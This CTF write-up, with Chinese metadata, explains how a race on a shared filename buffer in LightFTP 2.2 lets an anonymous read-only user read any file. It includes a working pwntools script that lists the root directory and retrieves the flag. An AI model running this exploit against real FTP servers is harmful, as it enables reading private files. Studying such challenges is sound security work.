---
title: Real World CTF 2023 - NonHeavyFTP Writeup
contest: Real World CTF 2023
year: 2023
difficulty: medium
vuln_type: pwn_unknown
tags:
- ftp
- lightftp
- race-condition
- strcpy
- ftp-list
- ftp-retr
- file-read
- anonymous
- source-review
attack_chain:
- LightFTP 2.2 (最新) 源码 + 编译 binary + config readonly
- fuzz (boofuzz) 500 exec/s 跑 32k session 无果 → 转向源码审计
- '漏洞点: ftpUSER (ftpserv.c#L265) strcpy(context->FileName, params) - 看似可溢出但实际不能'
- '真实漏洞: ftpLIST + stor_thread 共享 context->FileName'
- '攻击: LIST ''random'' 触发 list_thread 阻塞 (无 client 连 data port)'
- 此时 USER '/etc' 覆盖 context->FileName 为任意路径
- 连接 data port 让 list_thread 解阻塞, 走 open(context->FileName) 任意读
- '步骤 1: LIST 触发 list_thread + 立即 USER / 列根目录'
- '步骤 2: RETR hello.txt + USER /flag.deb10154-8cb2-11ed-be49-0242ac110002 读 flag'
- 同理可读任意文件
key_payload: p.sendline(b"LIST ") + p.sendline(b"USER /") + connect(data_port)
one_liner: 'Real World CTF 2023 NonHeavyFTP: LightFTP 2.2 源码审计发现 ftpUSER 共享 context->FileName 触发 list_thread race condition，列目录/读 flag 任意文件。'
lesson: FTP USER/LIST 等命令共享 context->FileName 缓冲区是经典 race condition；strcpy 看似漏洞但实际 buffer 不够大；线程共享变量的 race 是 read-only bypass 关键。
quality: medium
full_path: Real_World_CTF_2023_–_NonHeavyFTP.full.md
meta_path: Real_World_CTF_2023_–_NonHeavyFTP.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'Real World CTF 2023 - NonHeavyFTP Writeup。Real World CTF 2023 NonHeavyFTP: LightFTP 2.2 源码审计发现 ftpUSER 共享 context->FileName 触发 list_thread race condition，列目录/读 flag 任意文件。。关键路径：LightFTP 2.2 (最新) 源码 ...'
category: pwn
subcategory: pwn_other
time_required: medium
difficulty_score: 3
code_blocks_count: 0
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/90436.html
reasoning_chain:
- LightFTP 2.2 (最新) 源码 + 编译 binary + config readonly → 触发点：源码审计
- boofuzz 500 exec/s 跑 32k session 无果 → 假设：必须源码审计
- 漏洞点：ftpUSER (ftpserv.c#L265) strcpy(context->FileName, params) - 假设：可溢出 → 实际 buffer 不够
- 真实漏洞：ftpLIST + stor_thread 共享 context->FileName → 假设：线程 race
- 攻击：LIST 'random' 触发 list_thread 阻塞 (无 client 连 data port) → 假设：USER / 此时可覆盖 FileName
- 动作：connect data_port 让 list_thread 解阻塞 → 走 open(context->FileName) → 任意读
- 步骤 1：LIST 触发 list_thread + 立即 USER / 列根目录 → 步骤 2：RETR hello.txt + USER /flag 读 flag
- 同理可读任意文件 → 完成
failed_attempts:
- 试图走 strcpy 溢出 → 失败：buffer 不够大
- 试图 boofuzz fuzz → 失败：32k session 无果
- 试图单线程 USER → 失败：必须 LIST 阻塞后 USER
key_observations:
- FTP USER/LIST 等命令共享 context->FileName 是经典 race condition
- strcpy 看似漏洞但实际 buffer 不够是反陷阱
- 线程共享变量 race 是 read-only bypass 关键
- LIST 后不连 data_port 让 list_thread 阻塞是 timing 关键
- LightFTP 配置 readonly 但 race condition 绕过权限
prerequisites:
- FTP 协议 (USER/LIST/RETR/PASV)
- LightFTP 源码审计
- 线程共享变量 race condition
- boofuzz 模糊测试基本使用
---
# Real World CTF 2023 – NonHeavyFTP

> 原文: https://www.ctfiot.com/90436.html
> ID: 90436

This is a short writeup on the “NonHeavyFTP” challenge from Real World CTF 2023. This was one of the easier challenges with the goal of exploiting LightFTP in Version 2.2 (the latest one on github at the time). I ended up with a file-read vulnerability that allowed to read the flag.

Vulnerability Discovery

We are given a compiled binary but there is no need to use it (unless you want to use it for local testing) since the source is on github. In addition, we get the config used on the remote system which only allows anonymous login with read-only permissions:

...

[anonymous]

pswd=*

accs=readonly

...

Unless we can somehow bypass this, we are limited to reading files (and reading the flag is enough to finish this challenge). I started to fuzz the challenge with boofuzz & the FTP fuzzing-script from its author. Unfortunately, this did not yield any results but for documentation’s sake this is how it’s setup:

FTP Fuzzing Script

Boofuzz

# install boofuzz

mkdir boofuzz && cd boofuzz

python3 -m venv env

source env/bin/activate

pip install -U pip setuptools

pip install boofuzz

# start local version of fftp on port 2121

./fftp

# start fuzzer

python3 fuzz.py fuzz --target-port=2121 --target-host=127.0.0.1 --username=anonymous --password=xct

This ran at about 500 exec/s on my VM but required restarting every ~32k sessions because the user limit was reached and increasing it in the config did not help. It did not find any vulnerabilities though. That leaves us with source code review to find something. Looking a bit around for dangerious functions we find a strcpy at https://github.com/hfiref0x/LightFTP/blob/master/Source/ftpserv.c#L265 :

int ftpUSER(PFTPCONTEXT context, const char *params)

{

if ( params == NULL )

return sendstring(context, error501);

context->Access = FTP_ACCESS_NOT_LOGGED_IN;

writelogentry(context, " USER: ", (char *)params);

snprintf(context->FileName, sizeof(context->FileName), "331 User %s OK. Password required\r\n", params);

sendstring(context, context->FileName);

/* Suspicious strcpy */

strcpy(context->FileName, params);

return 1;

}

This looked interesting (e.g. send a large username to overflow the buffer) but it turned out that we can not send a buffer large enough to overflow context->FileName. If we search for other uses of context->FileName , we can see that most FTP commands are actually using this as a buffer to hold different things. At this point I was thinking we might be able to use a race condition to overwrite the contents of this buffer after a function does checks on it, for example:

int ftpLIST(PFTPCONTEXT context, const char *params)

{

...

/* this function makes sure we stay inside the ftp root directory */

ftp_effective_path(context->RootDir, context->CurrentDir, params, sizeof(context->FileName), context->FileName);

while (stat(context->FileName, &filestats) == 0)

{

if ( !S_ISDIR(filestats.st_mode) )

break;

sendstring(context, interm150);

writelogentry(context, " LIST", (char *)params);

context->WorkerThreadAbort = 0;

pthread_mutex_lock(&context->MTLock);

context->WorkerThreadValid = pthread_create(&tid, NULL, (void * (*)(void *))list_thread, context);

if ( context->WorkerThreadValid == 0 )

context->WorkerThreadId = tid;

else

sendstring(context, error451);

pthread_mutex_unlock(&context->MTLock);

return 1;

}

return sendstring(context, error550);

}

If we could overwrite context->FileName after the ftp_effective_path function is called, it would just open the file we want even if its outside the ftp root. This buffer is assigned per connection though, so it’s not possible to overwrite it from a new connection.

There is however a different way that does not rely on a new connection. FTP can be used in passive and active mode. The way this works is, that for FTP there is a command channel and a data channel. In active mode we connect to (usually port 21) the command port and can issue whatever commands we want. If we want to get any data back, the service will connect to a port on our client-machine and send the data. In passive mode, if we connect to the service it will tell us a port on the server-side that we can connect to, to get the data. It turns out active mode is not possible here due to firewall constraints so we have to use passive mode.

If we issue a command in passive mode, like the LIST command in the example above, it will try to send the listing data to the port that was defined when we made the connection. As long as we do not connect there it can however not send the data.

This is the way it sends (after we connect) it via the stor_thread function:

void *stor_thread(PFTPCONTEXT context)

{

...

f = open(context->FileName, O_CREAT | O_RDWR | O_TRUNC, S_IRWXU | S_IRGRP | S_IROTH);

context->File = f;

if (f == -1)

break;

...

return NULL;

}

This function is run as a new thread and is also using context->FileName! This means that we can do the following:

Issue LIST command with some random path, it will get stored in context->FileName. The thread starts but blocks since no connection has been made. As soon as it unblocks it will read context->FileName.

Issue USER command with a crafted username (directory name that we want to list), this will also get stored in context->FileName. Since the thread is still blocked that wants to send the result, we just overwrite the path after the checks were done!

Connect to the FTP data port to allow it to send the data

Exploitation

The flag has a random filename so we start by using our vulnerability to list the contents of the root directory:

from pwn import *

import binascii

context.terminal = ['alacritty', '-e', 'zsh', '-c']

RHOST = b"47.89.253.219"

def init():

p.recvuntil(b"220")

p.sendline(b"USER anonymous")

p.recvuntil(b"331")

p.sendline(b"PASS root")

p.recvuntil(b"230")

p.sendline(b"PASV")

p.recvline()

result = p.recvline().rstrip(b"\r\b")

parts = [int(s) for s in re.findall(r'\b\d+\b', result.decode())]

port = parts[-2]*256+parts[-1]

return port

def read(port):

p = remote(RHOST, port, level='debug')

print(p.recvall(timeout=2))

p.close()

# list dir

p = remote(RHOST, 2121, level='debug')

p.newline = b'\r\n'

port =init()

p.sendline(b"LIST ")  # send LIST command, wants to send us result via data port

p.sendline(b"USER /") # send USER command to overwrite dirname used by LIST

p.recvline()

read(port)

p.recvline()

p.recvline()

p.close()

Running this exploit lists the root directory and yields us the flag name. With the same technique we can now retrieve the flag file (or any file on the system):

...

p = remote(RHOST, 2121, level='debug')

p.newline = b'\r\n'

port =init()

p.sendline(b"RETR hello.txt")

p.sendline(b"USER /flag.deb10154-8cb2-11ed-be49-0242ac110002")

p.recvline()

read(port)

p.recvline()

p.recvline()

p.close()

That’s it for this challenge ?

原文始发于xct：Real World CTF 2023 – NonHeavyFTP